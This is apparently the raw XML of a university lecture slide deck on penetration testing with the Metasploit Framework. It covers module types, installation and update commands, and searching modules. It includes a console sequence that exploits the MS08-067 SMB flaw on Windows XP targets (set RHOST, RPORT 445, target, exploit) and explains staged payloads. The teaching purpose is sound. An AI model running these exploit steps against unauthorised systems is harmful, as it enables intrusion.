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88" r:id="rId4"/>
    <p:sldId id="289" r:id="rId5"/>
    <p:sldId id="258" r:id="rId6"/>
    <p:sldId id="259" r:id="rId7"/>
    <p:sldId id="260" r:id="rId8"/>
    <p:sldId id="261" r:id="rId9"/>
    <p:sldId id="263" r:id="rId10"/>
    <p:sldId id="291" r:id="rId11"/>
    <p:sldId id="264" r:id="rId12"/>
    <p:sldId id="266" r:id="rId13"/>
    <p:sldId id="265" r:id="rId14"/>
    <p:sldId id="262" r:id="rId15"/>
    <p:sldId id="267" r:id="rId16"/>
    <p:sldId id="268" r:id="rId17"/>
    <p:sldId id="290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008" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr>
      <p:cViewPr>
        <p:scale>
          <a:sx n="75" d="100"/>
          <a:sy n="75" d="100"/>
        </p:scale>
        <p:origin x="-2037" y="-3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59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956"/>
    </p:cViewPr>
  </p:sorterViewPr>
  <p:notesViewPr>
    <p:cSldViewPr>
      <p:cViewPr>
        <p:scale>
          <a:sx n="150" d="100"/>
          <a:sy n="150" d="100"/>
        </p:scale>
        <p:origin x="-810" y="29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B0644-BD0B-40B8-AF7A-8CD10AC08897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3A334-FE4D-4C3E-A61B-575B8EC3A5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197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845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02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978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842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14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625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23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76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09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28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86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02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90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80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21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43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rapid7.com/db/module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sz="2800" dirty="0" smtClean="0"/>
              <a:t>Penetration </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2800" dirty="0"/>
              <a:t>Testing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-GB" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>the 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Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> Framework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>
                <a:latin typeface="Arial Narrow" panose="020B0606020202030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Dr.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" smtClean="0">
                <a:latin typeface="Arial Narrow" panose="020B0606020202030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> Tran The Son</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0" smtClean="0">
                <a:latin typeface="Arial Narrow" panose="020B0606020202030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Vietnam – Korea University</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB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71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Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>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Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> framework is an open-source security project that offers multiple penetration testing and exploits development features. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>All </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>these features can be combined into a set of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>modules </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="AutoShape 2" descr="diagram of typical metasploit architectu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501008"/>
            <a:ext cx="5155124" cy="312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584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Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> 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472608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(1) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Payloads</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The single payloads are the complete lightweight malicious codes shared with the target machines.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staged payloads consist of a stub-loader that recalls the host machine to send the final piece of payload when </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>executed </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>on the target machine.</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>(2) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" b="1" dirty="0" smtClean="0"/>
              <a:t>Exploits</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>the tools used to take over the target machines by exploiting the vulnerabilities.</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>(3) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Encoders</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>play the role of code scramblers</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>(4) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Listeners</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>used to establishing a connection between the host and target machines</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>(5) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" b="1" dirty="0" err="1"/>
              <a:t>Auxiliary</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>functions</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>the supplementary tools and commands used to perform different penetration testing tasks, such as scanning, fuzzing, sniffing, etc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89594" y="786036"/>
            <a:ext cx="4514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/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>usr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>/share/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>-framework/modules/ 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7092280" y="791411"/>
            <a:ext cx="20005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~/. msf4/modules/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52323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dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 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/>
              <a:t>Check version and update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Since </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t> is a Ruby project, the bundler can track and install the exact </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Gems</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t> required to run the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>. 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Upgrade </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1" smtClean="0"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t> framework</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>Re-initiate </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t> database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911667" y="1628800"/>
            <a:ext cx="5402376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 smtClean="0"/>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> –v</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>msfupdate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>OR: </a:t>
            </a:r>
          </a:p>
          <a:p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/>
              <a:t>apt update; </a:t>
            </a:r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metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-framework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667" y="4221088"/>
            <a:ext cx="249369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gem install bundler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783" y="5301208"/>
            <a:ext cx="434593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apt-get upgrade </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-framework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783" y="6237312"/>
            <a:ext cx="182306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msfdb</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>reinit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695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Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> Startup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Starting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Interfaces</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>Msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>text-based console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Msfcli</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>command </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>line interface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601" y="1916833"/>
            <a:ext cx="3814522" cy="591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601" y="2753618"/>
            <a:ext cx="3583430" cy="481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43" y="4509120"/>
            <a:ext cx="2920419" cy="534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184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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>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08" y="1205598"/>
            <a:ext cx="8784976" cy="5112568"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A module is an executable file or DLL. Each process consists of one or more modules.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>H</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>ow </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>do we know this patch is missing on our Windows XP target</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>E.g. MS08-067 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>netapi32.dll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5085184"/>
            <a:ext cx="8424936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MS08-067 patched an issue in the netapi32.dll that could allow </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>attackers </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>to use a specially crafted remote procedure call request via the Server Message Block (SMB) service to take over a target system</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>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6857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Module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the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> search page to match </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> modules to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>vulnerabilities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03648" y="5877272"/>
            <a:ext cx="6473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Online database of modules </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://www.rapid7.com/db/modules/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06" y="2348880"/>
            <a:ext cx="7487244" cy="3165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3024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Search modules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…… Detail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8800"/>
            <a:ext cx="8731969" cy="2612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013176"/>
            <a:ext cx="8495680" cy="1205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832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" y="-1"/>
            <a:ext cx="6152533" cy="677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88225" y="0"/>
            <a:ext cx="2555775" cy="46166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Privileged</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" smtClean="0"/>
              <a:t>tells </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>us whether this module requires or grants high </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" smtClean="0"/>
              <a:t>privileges </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>on the target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b="1" dirty="0" smtClean="0"/>
              <a:t>Rank</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>lists the exploit’s potential impact on the target. Exploits are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" smtClean="0"/>
              <a:t> ranked </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>manual</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t> to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>excellent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b="1" dirty="0" smtClean="0"/>
              <a:t>Basic options</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>lists various options for the module that can be set to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" smtClean="0"/>
              <a:t>make </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>a module better meet our needs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b="1" dirty="0" smtClean="0"/>
              <a:t>Payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" smtClean="0"/>
              <a:t> contains </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>information to help </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t> decide </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>which payloads it can use with this exploit. Payloads, or shellcode, tell </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" smtClean="0"/>
              <a:t> the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>exploited system what to do on behalf of the attacker.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39" y="836712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39" y="-588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305073" y="1910125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305073" y="2924944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5935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Examine the folder structure of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> modules</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Payload</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Exploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Encoder</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Listeners</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>Auxillary</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Examine the code </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Example.py (or: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>E</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>xample.rb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658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Module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Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> will figure out what </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>you </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>want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285" y="1736715"/>
            <a:ext cx="517207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851" y="2815768"/>
            <a:ext cx="6382642" cy="39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6150" y="2446436"/>
            <a:ext cx="2564135" cy="3416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RHOST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> refers </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>to the remote host we want to exploit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RPORT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>refers to the remote port to attack. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>SMBPIPE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>the RPORT value, keep the default for the SMBPIPE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>as BROWSER</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0"/>
              <a:t>Exploit Target </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>target </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>operating </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>system and version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26322" y="5013176"/>
            <a:ext cx="2855654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To set a target option, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>enter:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" smtClean="0"/>
              <a:t>et target</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> &lt;target </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>number&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5150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51720" y="1988840"/>
            <a:ext cx="21802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msf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> &gt; set RHOST </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>&lt;IP&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>msf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&gt; set RPORT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>445</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>msf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>&gt; set target 0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>m</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>sf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>&gt; exploit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34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Payloads (or Shellcode)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US" dirty="0" smtClean="0"/>
              <a:t>hat </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>to do once the target has been </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>exploited?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>One of the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>ways </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>that </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> makes things easier is by setting up our payloads for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>us</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> has a plethora of payloads, ranging from simple Windows </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>commands </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>to the extensible </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Meterpreter</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, in simple terms, are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>simple scripts </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>that the hackers utilize to interact with a hacked </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>system.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>payloads, they can transfer data to a victim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701" y="5229200"/>
            <a:ext cx="8712968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Singles</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> − </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>very </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>small and designed to create some kind of communication, then move to the next stage. For example, just creating a user.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Staged</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> − It is a payload that an attacker can use to upload a bigger file onto a victim system.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Stages</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> − </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>payload </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>components that are downloaded by Stagers modules. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Payload </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
